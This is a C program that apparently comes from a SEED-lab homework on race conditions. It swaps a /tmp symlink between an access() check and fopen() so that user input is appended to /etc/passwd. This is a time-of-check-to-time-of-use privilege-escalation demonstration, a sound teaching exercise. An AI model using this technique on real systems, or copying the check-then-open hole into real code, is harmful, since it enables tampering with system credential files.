#include <stdlib.h>
#include <sys/param.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void main(){
  char *fn = "/tmp/XYZ";
  char buffer[60];
  FILE *fp;

  unlink(fn);
  symlink("/home/seed/Desktop/CSOS/HW1/RaceCondition/textRes.txt", fn);
  printf("/tmp/XYZ -> ./resCheck.txt\n");

  scanf("%50s", buffer);
  if(!access(fn, W_OK)) {
    unlink(fn);
    symlink("/etc/passwd", fn);
    printf("/tmp/XYZ -> /etc/passwd\n");
    
    fp = fopen(fn, "a+");
    if (fp != NULL) {   
      fwrite("\n", sizeof(char), 1, fp);
      fwrite(buffer, sizeof(char), strlen(buffer), fp);
      fclose(fp);
      printf("%s\n\n",buffer);
    } else printf("No Open\n");
  } else printf("No Permission\n");
}
